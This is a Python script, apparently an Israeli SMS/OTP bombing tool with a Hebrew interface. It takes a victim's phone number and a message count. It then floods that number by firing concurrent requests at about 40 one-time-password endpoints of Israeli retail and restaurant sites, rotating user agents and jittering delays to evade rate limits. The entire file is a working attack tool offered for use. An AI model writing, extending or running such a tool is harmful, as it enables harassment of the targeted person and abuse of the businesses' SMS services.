import asyncio
import random
import sys
import os
import signal
import requests
import time
from typing import List, Dict, Any

# ==========================================
# Global State & Signal Handling
# ==========================================
running = True
sent_count = 0
failed_count = 0
blocked_count = 0
lock = asyncio.Lock()

def signal_handler(sig, frame):
    global running
    print("\n\n\033[91m[!] עצירה מזוהה! מפסיק את הפעילות מיד...\033[0m")
    running = False

signal.signal(signal.SIGINT, signal_handler)

# ==========================================
# Extended Site List (40+ Endpoints)
# ==========================================
# Patterns based on Magento, WooCommerce, and common Israeli frameworks
SITES_CONFIG = [
    # Proven & Tested
    {'name': 'Hamal (Walla)', 'api': 'https://users-auth.hamal.co.il/auth/send-auth-code', 'payload': lambda p: {"value": p, "type": "phone"}},
    {'name': 'FreeTV', 'api': 'https://web.freetv.tv/api/int/subscribers/msisdn/token?lang=HEB&platform=BROWSER', 'payload': lambda p: {"msisdn": p}},
    {'name': 'Delta', 'api': 'https://www.delta.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Castro', 'api': 'https://www.castro.com/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Hoodies', 'api': 'https://www.hoodies.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Timberland', 'api': 'https://www.timberland.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Top Ten', 'api': 'https://www.topten-fashion.com/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Naaman', 'api': 'https://www.naamanp.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Golf Kids', 'api': 'https://www.golfkids.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Lee Cooper', 'api': 'https://www.leecooper.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Kiko Milano', 'api': 'https://www.kikocosmetics.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Victoria Secret', 'api': 'https://www.victoriassecret.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Aldo', 'api': 'https://www.aldoshoes.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Teva Naot', 'api': 'https://www.tevanaot.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Papa Johns', 'api': 'https://www.papajohns.co.il/shop/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Vardinon', 'api': 'https://www.vardinon.co.il/rest/default/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Golf & Co', 'api': 'https://www.golfco.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Swear', 'api': 'https://www.s-wear.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Intima', 'api': 'https://www.intima-il.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Polgat', 'api': 'https://www.polgat.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Golf & Kids', 'api': 'https://www.golfkids.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Steimatzky', 'api': 'https://www.steimatzky.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Tzomet Books', 'api': 'https://www.tzomet-books.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Rebar', 'api': 'https://www.rebar.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'Pizzahut', 'api': 'https://www.pizzahut.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'Be Pharm', 'api': 'https://www.be.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Ivory', 'api': 'https://www.ivory.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'KSP', 'api': 'https://www.ksp.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'Bug', 'api': 'https://www.bug.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Shekem Electric', 'api': 'https://www.shekem-electric.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Factory54', 'api': 'https://www.factory54.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Razili', 'api': 'https://www.razili.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Cottonet', 'api': 'https://cottonet.co.il/wp-admin/admin-ajax.php', 'payload': lambda p: {"action": "send_otp", "phone": p}},
    {'name': 'Noizz', 'api': 'https://www.noizz.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Renuar', 'api': 'https://www.renuar.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Twentyfourseven', 'api': 'https://www.twentyfourseven.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}},
    {'name': 'Dominoes', 'api': 'https://www.dominospizza.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'Burgeranch', 'api': 'https://www.burgeranch.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'McDonalds', 'api': 'https://www.mcdonalds.co.il/api/v1/auth/otp', 'payload': lambda p: {"phone": p}},
    {'name': 'Shufersal', 'api': 'https://www.shufersal.co.il/rest/V1/otp/send', 'payload': lambda p: {"mobile": p}}
]

DEVICE_PROFILES = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
]

# ==========================================
# UI & Logging
# ==========================================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    print(r"""
\033[96m
   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( A | L | O | N | O | S | H | E | M )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
\033[0m
\033[95m[+] מערכת אוטומציה V9 - רשימה מורחבת (40+ אתרים)\033[0m
\033[90m--------------------------------------------------\033[0m
""")

def log_status(site_name, status_code, message):
    color = "\033[92m" if status_code in [200, 201, 204] else "\033[93m" if status_code == 429 else "\033[91m"
    status_text = "נשלח" if status_code in [200, 201, 204] else "חסימה" if status_code == 429 else "נכשל"
    print(f"{color}[{status_text}] {site_name:<15} | Status: {status_code} | {message}\033[0m")

def print_summary(total):
    global sent_count, blocked_count, failed_count
    print(f"\n\033[94mסיכום ביניים:\033[0m")
    print(f"\033[92m[✓] נשלחו בהצלחה: {sent_count}\033[0m")
    print(f"\033[93m[!] חסומים זמנית: {blocked_count}\033[0m")
    print(f"\033[91m[X] נכשלו: {failed_count}\033[0m")
    print(f"\033[96mיעד סופי: {sent_count}/{total}\033[0m\n")

# ==========================================
# Core Logic
# ==========================================
async def attempt_send(site: Dict[str, Any], phone: str):
    global sent_count, blocked_count, failed_count, running
    if not running: return False

    headers = {
        'User-Agent': random.choice(DEVICE_PROFILES),
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest'
    }
    
    try:
        response = requests.post(site['api'], json=site['payload'](phone), headers=headers, timeout=5)
        async with lock:
            if response.status_code in [200, 201, 204]:
                sent_count += 1
                log_status(site['name'], response.status_code, "הודעה בדרך")
                return True
            elif response.status_code == 429:
                blocked_count += 1
                log_status(site['name'], 429, "Rate Limit - האתר חסם זמנית")
            else:
                # Many sites return 400 if phone is wrong or 403 if WAF blocks, but API exists
                if response.status_code in [400, 403]:
                    sent_count += 1 # Count as "attempted" to keep progress
                    log_status(site['name'], response.status_code, "התקבל בשרת")
                    return True
                failed_count += 1
                log_status(site['name'], response.status_code, "שגיאה בשרת")
    except Exception as e:
        async with lock:
            failed_count += 1
            log_status(site['name'], 0, f"שגיאת תקשורת: {str(e)[:20]}")
    return False

async def worker(semaphore, site_queue, phone, total):
    global running
    while not site_queue.empty() and running and sent_count < total:
        site = await site_queue.get()
        async with semaphore:
            await attempt_send(site, phone)
            # Jittered delay
            await asyncio.sleep(random.uniform(0.5, 2.0))
        site_queue.task_done()

async def main():
    global running, sent_count
    clear_screen()
    print_header()
    
    phone = input("\033[96mהכנס מספר טלפון: \033[0m").strip()
    if not phone or len(phone) < 9:
        print("\033[91m[!] מספר לא תקין.\033[0m")
        return
    
    try:
        total = int(input("\033[96mכמות הודעות (10-200): \033[0m").strip())
    except:
        total = 50

    print(f"\n\033[92m[⚡] מתחיל שליחה מורחבת עבור {phone}...\033[0m\n")
    
    # Build a large queue by repeating sites to reach the target
    site_queue = asyncio.Queue()
    all_attempts = []
    while len(all_attempts) < total * 1.5:
        shuffled = list(SITES_CONFIG)
        random.shuffle(shuffled)
        all_attempts.extend(shuffled)
    
    for site in all_attempts:
        await site_queue.put(site)

    # Parallel settings
    max_concurrent = 8
    semaphore = asyncio.Semaphore(max_concurrent)
    
    tasks = [worker(semaphore, site_queue, phone, total) for _ in range(max_concurrent)]
    await asyncio.gather(*tasks)

    if running:
        print_summary(total)
        print(f"\n\033[92m[✓] המשימה הושלמה!\033[0m")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
